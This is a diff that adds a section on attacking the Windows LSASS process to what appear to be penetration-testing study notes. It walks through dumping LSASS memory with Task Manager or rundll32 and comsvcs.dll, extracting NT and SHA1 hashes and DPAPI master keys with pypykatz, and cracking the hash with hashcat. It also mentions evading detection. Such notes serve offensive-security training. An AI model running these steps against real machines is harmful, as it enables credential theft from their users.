@@ -1936,6 +1936,181 @@ netexec smb <TARGET IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
 
 </details>
 
+<details>
+<summary><h2>Attacking LSASS</h2></summary>
+
+In addition to obtaining copies of the SAM database for password hash extraction and cracking, we can also benefit from targeting the [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (LSASS). As discussed in the Credential Storage section of this module, LSASS is a core Windows process responsible for enforcing security policies, managing user authentication, and storing sensitive credential material in memory.
+
+Upon initial logon, LSASS will:
+
+* Cache credentials locally in memory
+* Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+* Enforce security policies
+* Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
+
+<details>
+<summary><h3>Attacking LSASS</h3></summary>
+
+Before extracting credentials from LSASS, it's wise to first create a memory dump of the LSASS process. This allows us to analyze its contents offline from our attack host. Performing the attack offline provides greater flexibility—enabling faster processing and reducing the time spent on the target system, which helps minimize detection risk.
+
+<details>
+<summary><h4>Dumping LSASS process memory</h4></summary>
+
+<details>
+<summary><h5>Task Manager method</h5></summary>
+
+With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:
+
+1. Open Task Manager
+2. Select the Processes tab
+3. Find and right click the Local Security Authority Process
+4. Select Create dump file
+5. A file called `lsass.dmp` is created and saved in `%temp%`.
+
+This is the file we will transfer to our attack host. 
+
+</details>
+
+<details>
+<summary><h5>Rundll32.exe & Comsvcs.dll method</h5></summary>
+
+The Task Manager method for dumping LSASS memory requires a GUI-based interactive session with the target, which isn't always available. As an alternative, we can use the command-line utility `rundll32.exe` to dump LSASS memory.
+
+> **NOTE:** Modern antivirus solutions typically flag this technique as malicious activity.
+
+Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:
+
+**Finding LSASS's PID in cmd**
+
+```cmd
+tasklist /svc
+```
+
+Expected output
+
+```cmd
+Image Name                     PID Services
+========================= ======== ============================================
+...
+lsass.exe                      672 KeyIso, SamSs, VaultSvc
+...
+```
+
+**Finding LSASS's PID in PowerShell**
+
+```powershell
+Get-Process lsass
+```
+
+Expected output
+
+```cmd
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1260      21     4948      15396       2.56    672   0 lsass
+```
+
+**Creating a dump file using PowerShell *(with an elevated PowerShell session)***
+
+```powershell
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+
+With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). 
+
+If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack host to attempt to extract any credentials that may have been stored in LSASS process memory.
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Using Pypykatz to extract credentials</h4></summary>
+
+Once the dump file is transferred to our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials directly from the .dmp file.
+
+**Install**
+
+```bash
+git clone https://github.com/skelsec/pypykatz.git
+cd pypykatz
+python3 setup.py install
+```
+
+At the time of writing, Mimikatz only runs on Windows systems. This means we’d either need a Windows-based attack host or run Mimikatz directly on the target—an approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.
+
+When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.
+
+**Running Pypykatz**
+
+```bash
+pypykatz lsa minidump lsass.dmp
+```
+
+**Output**
+
+MSV
+
+```bash
+sid S-1-5-21-4019466498-1700476312-3544718034-1001
+luid 1354633
+	== MSV ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+		LM: NA
+		NT: 64f12cddaa88057e06a81b54e73b949b
+		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
+		DPAPI: NA
+```
+
+[MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that the Local Security Authority (LSA) uses to validate logon attempts against the SAM database. In this case, pypykatz extracted details from the `bob` user account's logon session stored in LSASS memory—including the SID, username, domain, and both the NT and SHA1 password hashes.
+
+WDIGEST
+
+```bash
+	== WDIGEST [14ab89]==
+		username bob
+		domainname DESKTOP-33E7O54
+		password None
+		password (hex)
+```
+
+WDIGEST is an older authentication protocol that was enabled by default in Windows XP through Windows 8, as well as Windows Server 2003 through 2012. When enabled, LSASS caches WDIGEST credentials in **clear-text**, meaning that if we target a system with WDIGEST active, there's a high chance of retrieving a plaintext password. However, in modern Windows versions, WDIGEST is **disabled by default** to mitigate this risk.
+
+Kerberos
+
+```bash
+	== Kerberos ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+```
+
+[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by **Active Directory** in Windows domain environments. When a domain user authenticates, they are issued tickets that allow access to authorized network resources without re-entering credentials. LSASS stores Kerberos-related data such as passwords, encryption keys (ekeys), tickets, and PINs in memory. This makes it possible to extract these artifacts from LSASS and use them to access other systems within the same domain.
+
+DPAPI
+
+```bash
+	== DPAPI [14ab89]==
+		luid 1354633
+		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
+		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
+		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
+```
+
+Mimikatz and pypykatz can extract DPAPI master keys for logged-on users whose data resides in LSASS process memory. These master keys can then be used to decrypt secrets stored by various applications that rely on DPAPI, potentially revealing credentials for multiple accounts. DPAPI attack techniques are explored in greater depth in the [WINDOWS PRIVILEGE ESCALATION](./23-windows-privilege-escalation.md) module.
+
+**Cracking the NT Hash with Hashcat**
+
+```bash
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+</details>
+
+</details>
+
+</details>
+
 </details>
 
 ---
